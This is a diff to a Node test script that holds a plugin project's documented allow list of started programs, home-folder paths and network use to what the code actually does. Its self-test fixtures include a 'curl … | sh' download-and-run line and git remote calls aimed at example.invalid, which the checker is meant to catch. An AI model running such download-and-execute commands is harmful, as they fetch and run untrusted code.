@@ -20,6 +20,16 @@
 //
 // The writes check needs git and ssh-keygen; it is reported as NOT RUN, never as passed, when they are missing.
 //
+// What these checks do not cover, so nobody reads more into a pass than is there:
+//   - the two rows of section 2 about Claude Code's and Codex's own folders are exercised by the stand-in clients in
+//     scripts/fixtures/clients/standin.mjs, which was written to match those rows: that pair is a check of the
+//     stand-in, not of the real tools (the enrollment rehearsal measures the real ones);
+//   - the words of the page are not checked, only the facts a reader can compare with the code: a sentence in it can
+//     be rewritten to say the opposite and these checks stay green;
+//   - `scripts/` is read only for the files the runtime itself runs (the command line, the status line setup and the
+//     scrub check); the rehearsals and the delivery gate helper are not read;
+//   - a program started from a name built at run time, or by a program Skilliton starts, is named by hand in the page.
+//
 //   node scripts/allowlist.test.mjs              exit 0 when the list matches the code, 1 when it does not, 2 when a check could not run
 //   node scripts/allowlist.test.mjs --self-test  proves each check fails on known-bad input
 
@@ -37,7 +47,7 @@ const PLUGIN = "packs/base/plugins";
 const WORKFLOW = `${PLUGIN}/workflow`;
 
 // Functions that run the program their caller names, so their call sites are read the same way.
-const WRAPPERS = ["runProgram", "runClient"];
+const WRAPPERS = ["runProgram", "runClient", "startOnce"];
 
 // Every call whose program is not a string literal: what it starts, and how that is known. `count` is how many such
 // call sites the file has, so a new one fails this test instead of passing under an existing entry.
@@ -51,13 +61,14 @@ export const DYNAMIC_CALLS = [
   { file: `${WORKFLOW}/runtime/lib/collectors.mjs`, callee: "spawn", arg: "check.command[0]", count: 1, programs: [], policy: true, why: "a command from the project's own delivery policy, collecting test evidence" },
   { file: `${WORKFLOW}/runtime/lib/delivery.mjs`, callee: "spawn", arg: "check.command[0]", count: 1, programs: [], policy: true, why: "a command from the shared repository's delivery policy, run by the gate" },
   { file: `${WORKFLOW}/runtime/lib/delivery.mjs`, callee: "runProgram", arg: "runtimePath", count: 1, programs: ["bash", "node"], why: "delivery install probes the workflow plugin's bin/skilliton launcher, a bash script that runs node" },
-  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "spawnSync", arg: "probe", count: 1, programs: ["env", "bash"], why: "preflight runs the plugin's own probe script by its path, so its first line starts env and bash, the way Claude Code runs a hook" },
-  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "spawnSync", arg: "path", count: 1, programs: [], table: "PROGRAMS", why: "preflight starts each program from the PROGRAMS table in the same file once, with --version; the table is checked against section 1 below" },
+  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "spawnSync", arg: "file", count: 1, programs: [], why: "inside startOnce, the wrapper that waits for one program in its own process group; every caller of it is read below" },
+  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "startOnce", arg: "probe", count: 1, programs: ["env", "bash"], why: "preflight runs the plugin's own probe script by its path, so its first line starts env and bash, the way Claude Code runs a hook" },
+  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "startOnce", arg: "path", count: 1, programs: [], table: "PROGRAMS", why: "preflight starts each program from the PROGRAMS table in the same file once, with --version; the table is checked against section 1 below" },
 ];
 
 // Commands in a shell script whose program is an expansion: what they run, and how many such commands the file has.
 export const SHELL_DYNAMIC = [
-  { file: `${WORKFLOW}/runtime/preflight/probe.sh`, text: '"$path"', count: 2, why: "the program the preflight check asked about, found with command -v; the names come from the PROGRAMS table in runtime/lib/preflight.mjs" },
+  { file: `${WORKFLOW}/runtime/preflight/probe.sh`, text: '"$path"', count: 1, why: "the program the preflight check asked about, found with command -v; the names come from the PROGRAMS table in runtime/lib/preflight.mjs" },
 ];
 
 // Programs the allow list names that Skilliton does not start itself, with what does.
@@ -81,6 +92,7 @@ export const OUTSIDE_A_REPOSITORY = [
   [`${WORKFLOW}/runtime/commands/propose.mjs`, 'mkdtempSync(join(tmpdir(), "skilliton-propose-"))', "$TMPDIR/skilliton-propose-*, removed when propose finishes"],
   [`${WORKFLOW}/runtime/lib/preflight.mjs`, 'resolve(binDir ?? join(homedir(), ".local", "bin"))', "~/.local/bin, tested with a file the check removes again"],
   [`${WORKFLOW}/runtime/lib/preflight.mjs`, "{ path: tmpdir(), what:", "the temporary folder, tested the same way"],
+  [`${WORKFLOW}/runtime/lib/preflight.mjs`, "cwd: tmpdir()", "the reachability check runs from the temporary folder, so no repository's configuration is read"],
   [`${PLUGIN}/context-hygiene/hooks/statusline-quota.sh`, 'LOG="${SKILLITON_USAGE_LOG:-$HOME/.claude/skilliton/usage-log.jsonl}"', "~/.claude/skilliton/usage-log.jsonl"],
   [`${PLUGIN}/context-hygiene/hooks/statusline-quota.sh`, 'KEYS_LOG="${SKILLITON_KEYS_LOG:-$HOME/.claude/skilliton/statusline-keys-seen.log}"', "~/.claude/skilliton/statusline-keys-seen.log"],
   [`${PLUGIN}/context-hygiene/hooks/config-drift-check.sh`, 'SETTINGS="${SKILLITON_SETTINGS:-$HOME/.claude/settings.json}"', "Claude Code's settings, read only"],
@@ -89,12 +101,26 @@ export const OUTSIDE_A_REPOSITORY = [
   [`${PLUGIN}/guardrails/hooks/guard-bash.sh`, `'~/'*) if [ -n "\${HOME:-}" ]; then RESOLVED="$HOME/\${a#'~/'}"; else RESOLVED=""; fi ;;`, "the same"],
   [`${PLUGIN}/guardrails/hooks/guard-bash.sh`, 'if [ "$k" -ge "$n" ]; then EFF_DIR=${HOME:-}; return 0; fi', "the same, for a bare cd"],
   ["scripts/setup.mjs", "const HOME = homedir();", "~/.claude/settings.json and ~/.claude/backups/skilliton/, for the optional status line"],
+  [`${WORKFLOW}/runtime/lib/core.mjs`, 'const BACKUPS = process.env.SKILLITON_BACKUPS || join(HOME, ".claude", "backups", "skilliton")', "~/.claude/backups/skilliton/, the copy taken before a file outside a repository is changed"],
+  [`${WORKFLOW}/runtime/lib/core.mjs`, "const dir = join(BACKUPS, command,", "a folder per command and time under that backups folder"],
+  [`${WORKFLOW}/runtime/lib/core.mjs`, 'const ext = join(HOME, editor, "extensions")', "editor extension folders, read by doctor to find a bundled Claude Code"],
+  [`${WORKFLOW}/runtime/lib/core.mjs`, '{ label: "~/.claude/settings.json", path: join(HOME, ".claude", "settings.json") }', "Claude Code's settings, read by doctor"],
+  [`${WORKFLOW}/runtime/lib/core.mjs`, 'const knownPath = join(HOME, ".claude", "plugins", "known_marketplaces.json")', "Claude Code's marketplace records, read by doctor"],
+  [`${WORKFLOW}/runtime/lib/core.mjs`, 'const installedPath = join(HOME, ".claude", "plugins", "installed_plugins.json")', "Claude Code's install records, read by doctor"],
+  [`${WORKFLOW}/runtime/lib/core.mjs`, 'isFile(join(HOME, ".claude.json"))', "whether Claude Code has ever run under this home folder, read by doctor"],
+  ["scripts/setup.mjs", 'const SETTINGS = process.env.SKILLITON_SETTINGS ?? join(HOME, ".claude", "settings.json")', "~/.claude/settings.json, where the optional status line is set"],
+  ["scripts/setup.mjs", 'const BACKUPS = process.env.SKILLITON_BACKUPS ?? join(HOME, ".claude", "backups", "skilliton")', "~/.claude/backups/skilliton/, the copy taken before the settings are changed"],
+  ["scripts/setup.mjs", 'const earlier = join(HOME, ".claude", "backups", ', "the backups folder used before the rename, named in a message and never read"],
+  ["scripts/setup.mjs", "const bdir = join(BACKUPS, dirs[dirs.length - 1])", "the newest backup, read by --undo"],
+  ["scripts/setup.mjs", "const bdir = join(BACKUPS, stamp)", "the backup this run writes"],
   ["scripts/scrub-check.sh", 'DENY="${SKILLITON_DENYLIST:-$HOME/.config/skilliton/denylist}"', "the private denylist, read only"],
   ["scripts/scrub-check.sh", 'LEGACY_DENY="$HOME/.config/', "the denylist location used before the rename, named and never read"],
   ["scripts/scrub-check.sh", 'hits=$(printf \'%s\\n\' "$files" | tr \'\\n\' \'\\0\' | xargs -0 grep -H -I -n -E "$HOMEPATH" 2>/dev/null)', "a pattern for home paths in files, not a folder"],
   ["scripts/scrub-check.sh", 'n=$(printf \'%s\\n\' "$log" | grep -c -E "$HOMEPATH")', "the same pattern"],
 ];
-const OUTSIDE_RE = /homedir\(\)|process\.env\.HOME|tmpdir\(\)|\$\{?HOME\}?|\$\{?TMPDIR/;
+// Also the module-level constants a file may reuse (core.mjs's HOME and BACKUPS), so a new path built from one of
+// them is a new place the code reaches, not an invisible line.
+const OUTSIDE_RE = /homedir\(\)|process\.env\.HOME|tmpdir\(\)|\$\{?HOME\}?|\$\{?TMPDIR|(?:join|resolve)\(\s*(?:HOME|BACKUPS)\b/;
 
 // Network use the allow list permits. Each entry must also be named in section 4; with none, section 4 says the code
 // makes no requests of its own, and this test holds it to that.
@@ -106,6 +132,12 @@ const GIT_WRAPPERS = { [`${PLUGIN}/guardrails/hooks/guard-bash.sh`]: ["g"] };
 
 const read = (path) => readFileSync(join(REPO, path), "utf8");
 const sorted = (set) => [...set].sort();
+
+// Files under the plugins that neither reader covers. A file nothing reads can start anything: a hook that sources
+// hooks/common.bash, or a helper written in another language, would be invisible to every check below.
+export function checkEveryFileIsRead(files) {
+  return (files.other ?? []).map((path) => `${path} is under the plugins but is neither a script nor JavaScript this test reads, so nothing checks what it starts; give it a .sh or .mjs name, or a first line naming its interpreter, or take it out of the plugin`);
+}
 
 // ---------- programs ----------
 
@@ -180,6 +212,7 @@ export function hookCommands(files = scopeFiles(), readFile = read, listHooks = 
       shells.push(`${path} (${m[1]})`);
     }
   }
+  if (!shells.length) problems.push(`no hook registration was read at all (looked for ${PLUGIN}/<plugin>/hooks/hooks.json); the check would pass while saying nothing`);
   return { shells, problems };
 }
 
@@ -319,7 +352,7 @@ export function measureWrites() {
 
     const env = {
       ...GIT_ENV, PATH: `${ws.tools}:${process.env.PATH ?? ""}`, HOME: ws.home, TMPDIR: ws.tmp, LANG: "C.UTF-8",
-      SKILLITON_SELF: "skilliton", STANDIN_LOG: ws.log, STANDIN_DEFAULT_HOME: "1",
+      SKILLITON_SELF: "skilliton", STANDIN_LOG: ws.log, STANDIN_DEFAULT_HOME: ws.home,
     };
     const run = (file, args, options = {}) => spawnSync(file, args, { encoding: "utf8", env: { ...env, ...options.env }, cwd: options.cwd ?? base, input: options.input, timeout: 120000 });
     const cli = (args, options) => run(process.execPath, [join(ws.repo, "scripts", "skilliton.mjs"), ...args], options);
@@ -339,13 +372,16 @@ export function measureWrites() {
     const hook = (name, input) => run(join(ws.repo, PLUGIN, "workflow", "bin", "skilliton"), ["hook", name], { cwd: ws.project, input, env: { CLAUDE_PROJECT_DIR: ws.project } });
     const script = (plugin, name, input, extra = {}) => run("bash", [join(ws.repo, PLUGIN, plugin, "hooks", name)], { cwd: ws.project, input, env: { CLAUDE_PROJECT_DIR: ws.project, ...extra } });
     const sessionInput = JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "SessionStart" });
+    // Each step says which exit statuses are expected, so a step that stops working is reported instead of quietly
+    // measuring less. 1 is expected where a command reports a state that needs attention (verify has no signed
+    // release here, doctor finds things missing in a sandbox).
     const steps = [
-      ["join --apply", () => cli(["join", "--company", "acme", "--signers", join(ws.keys, "allowed_signers"), "--marketplace", ws.repo, "--apply"])],
-      ["verify", () => cli(["verify", "--company", "acme"])],
-      ["doctor", () => cli(["doctor", "--dir", ws.project])],
+      ["join --apply", () => cli(["join", "--company", "acme", "--signers", join(ws.keys, "allowed_signers"), "--marketplace", ws.repo, "--apply"]), [0, 1]],
+      ["verify", () => cli(["verify", "--company", "acme"]), [0, 1]],
+      ["doctor", () => cli(["doctor", "--dir", ws.project]), [0, 1]],
       ["status line setup --apply", () => run(process.execPath, [join(ws.repo, "scripts", "setup.mjs"), "--apply"])],
       ["the status line", () => run("bash", [join(ws.repo, PLUGIN, "context-hygiene", "hooks", "statusline-quota.sh")], { input: JSON.stringify({ model: { display_name: "test" }, context_window: { used_percentage: 1 }, cost: { total_cost_usd: 0 } }) })],
-      ["preflight", () => cli(["preflight", "--no-network", "--repo", ws.repo])],
+      ["preflight", () => cli(["preflight", "--no-network", "--repo", ws.repo]), [0, 1]],
       ["prepare --apply", () => cli(["prepare", "--dir", ws.project, "--apply"])],
       ["task start --apply", () => cli(["task", "start", "a task", "--dir", ws.project, "--apply"])],
       ["checkpoint --apply", () => cli(["checkpoint", "--state", "s", "--evidence", "e", "--next", "n", "--dir", ws.project, "--apply"])],
@@ -357,6 +393,15 @@ export function measureWrites() {
       ["the guardrails session hook", () => script("guardrails", "session-start-guardrails.sh", sessionInput)],
       ["the guardrails command hook", () => script("guardrails", "guard-bash.sh", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "git commit -m test" } }))],
       ["the checklist hook", () => script("context-hygiene", "session-start-checklist.sh", sessionInput, { SKILLITON_LESSONS: join(ws.project, "README.md") })],
+      ["status", () => cli(["status", "--dir", ws.project]), [0, 1]],
+      ["record a decision --apply", () => cli(["record", "decision", "a choice", "--dir", ws.project, "--apply"])],
+      ["index --apply", () => cli(["index", "--dir", ws.project, "--apply"])],
+      ["harness --apply", () => cli(["harness", "--dir", ws.project, "--apply"])],
+      ["migrate", () => cli(["migrate", "--dir", ws.project]), [0, 1]],
+      ["security status", () => cli(["security", "status", "--dir", ws.project]), [0, 1]],
+      ["trust show", () => cli(["trust", "show"]), [0, 1]],
+      ["task list", () => cli(["task", "list", "--dir", ws.project]), [0, 1]],
+      ["remove (preview)", () => cli(["remove", "--dir", ws.project]), [0, 1]],
       ["the status line setup --undo", () => run(process.execPath, [join(ws.repo, "scripts", "setup.mjs"), "--undo"])],
       ["join --undo --apply", () => cli(["join", "--undo", "--company", "acme", "--apply"])],
     ];
@@ -364,10 +409,10 @@ export function measureWrites() {
     // one wrote, and this check is about every place the machine was written, not what is left at the end.
     const ran = [];
     const written = new Set();
-    for (const [label, step] of steps) {
+    for (const [label, step, expected = [0]] of steps) {
       const r = step();
       if (r.error) return { notRun: `the step "${label}" could not run: ${r.error.message}` };
-      ran.push({ label, exit: r.status, output: `${r.stdout ?? ""}${r.stderr ?? ""}`.trim() });
+      ran.push({ label, exit: r.status, expected, output: `${r.stdout ?? ""}${r.stderr ?? ""}`.trim() });
       for (const path of walkRelative(ws.home)) written.add(path);
     }
     return { written: [...written].sort(), leftInTemp: walkRelative(ws.tmp), steps: ran };
@@ -396,7 +441,8 @@ function walkRelative(dir, out = [], root = dir) {
 function main() {
   const doc = read(ALLOWLIST_DOC);
   const files = scopeFiles();
-  let failed = 0, notRun = 0;
+  let failed = 0;
+  let notRun = 0;
   const report = (name, violations) => {
     for (const v of violations) console.log(`FAIL ${name}: ${v}`);
     console.log(violations.length ? `${name}: ${violations.length} problem(s)` : `ok   ${name}`);
@@ -405,8 +451,10 @@ function main() {
 
   const { found, problems } = programsFromCode(files);
   const hooks = hookCommands(files);
+  report("every file under the plugins is read by this test", checkEveryFileIsRead(files));
   report("programs the code starts are read", [...problems, ...hooks.problems]);
-  report("section 1 names every program the code starts", problems.length ? [] : checkPrograms(found, doc));
+  if (problems.length) { console.log("NOT RUN section 1 names every program the code starts: the code could not be read in full (above), so the comparison would have been made against an incomplete list"); notRun++; }
+  else report("section 1 names every program the code starts", checkPrograms(found, doc));
   report("the preflight check looks for every program section 1 names", checkPreflightTable(doc));
   report("section 2 covers every place the code reaches outside a repository", checkOutsideReach(files));
   report("section 4 matches the code's network use", checkNetwork(files, read, doc));
@@ -417,10 +465,10 @@ function main() {
     const measured = measureWrites();
     if (measured.notRun) { console.log(`NOT RUN writes in an empty home folder: ${measured.notRun}`); notRun++; }
     else {
-      const failedSteps = measured.steps.filter((s) => s.exit !== 0 && s.exit !== 1);
+      const failedSteps = measured.steps.filter((s) => !s.expected.includes(s.exit));
       for (const s of failedSteps) console.log(`     the step "${s.label}" exited ${s.exit}: ${s.output.split("\n").slice(-2).join(" ").slice(0, 200)}`);
       const leftovers = measured.leftInTemp.length ? [`the scenario left ${measured.leftInTemp.length} path(s) in the temporary folder (${measured.leftInTemp.slice(0, 3).join(", ")}); every temporary file is meant to be removed`] : [];
-      const stepProblems = failedSteps.map((s) => `the step "${s.label}" exited ${s.exit}, so what it would have written was not measured`);
+      const stepProblems = failedSteps.map((s) => `the step "${s.label}" exited ${s.exit} (expected ${s.expected.join(" or ")}), so what it would have written was not measured`);
       report(`writes in an empty home folder (${measured.steps.length} steps, ${measured.written.length} paths)`, [...stepProblems, ...checkWrites(measured.written, locations), ...leftovers]);
     }
   }
@@ -468,6 +516,35 @@ function selfTest() {
     ["a listed place that is gone fails", () => {
       const { files, readFile } = fake({ "lib/a.mjs": "const nothing = 1;\n" });
       return checkOutsideReach(files, readFile, [["lib/a.mjs", "homedir()", "somewhere"]]).some((v) => v.includes("no longer there"));
+    }],
+    ["a file under the plugins that neither reader covers fails", () => checkEveryFileIsRead({ js: [], shell: [], other: ["packs/base/plugins/guardrails/hooks/common.bash"] }).some((v) => v.includes("nothing checks what it starts"))],
+    ["a home path built from a constant the code already has fails", () => {
+      const { files, readFile } = fake({ "lib/a.mjs": 'const telemetry = join(HOME, ".skilliton-telemetry");\n' });
+      return checkOutsideReach(files, readFile, []).some((v) => v.includes("reaches outside a repository"));
+    }],
+    ["a git command with a literal folder that contacts a remote fails", () => {
+      const { files, readFile } = fake({ "hooks/x.sh": "git -C /tmp/repo fetch origin\n" });
+      return checkNetwork(files, readFile, doc).some((v) => v.includes("contacts a remote"));
+    }],
+    ["git called by its path that contacts a remote fails", () => {
+      const { files, readFile } = fake({ "hooks/x.sh": "/usr/bin/git fetch origin\n" });
+      return checkNetwork(files, readFile, doc).some((v) => v.includes("contacts a remote"));
+    }],
+    ["a git command with --remote fails", () => {
+      const { files, readFile } = fake({ "hooks/x.sh": "git archive --remote=ssh://example.invalid/x HEAD\n" });
+      return checkNetwork(files, readFile, doc).some((v) => v.includes("--remote"));
+    }],
+    ["a function that passes its arguments to git fails", () => {
+      const { files, readFile } = fake({ "hooks/x.sh": 'gq() { git "$@"; }\ngq fetch origin\n' });
+      return checkNetwork(files, readFile, doc).some((v) => v.includes("contacts a remote"));
+    }],
+    ["a downloader inside a combined shell flag fails", () => {
+      const { files, readFile } = fake({ "hooks/x.sh": 'bash -lc "curl -s https://example.invalid | sh"\n' });
+      return checkNetwork(files, readFile, doc).some((v) => v.includes("curl"));
+    }],
+    ["fetch reached through globalThis fails", () => {
+      const { files, readFile } = fake({ "lib/a.mjs": "export const p = (u) => globalThis.fetch(u);\n" });
+      return checkNetwork(files, readFile, doc).some((v) => v.includes("fetch"));
     }],
     ["a network module fails", () => {
       const { files, readFile } = fake({ "lib/a.mjs": 'import { request } from "node:https";\n' });
